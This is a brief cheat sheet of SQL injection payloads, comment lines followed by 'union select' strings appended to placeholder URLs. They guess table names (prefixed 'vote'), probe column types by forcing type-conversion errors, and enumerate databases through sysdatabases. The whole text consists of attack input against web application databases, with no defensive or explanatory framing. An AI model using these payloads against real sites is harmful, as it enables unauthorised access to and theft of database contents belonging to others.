-- guessing a table in the database
<URL>' union select * from vote<table name>--


-- A way of guessing what kind of columns there are in the tables.
-- Intentionally making type convertion errors
<URL>' union select 1,1 from vote<table name>--
<URL>' union select 1,'1' from vote<table name>--
<URL>' union select <colum names> from <table name>
<URL>' union select 0, name from sysdatabases--
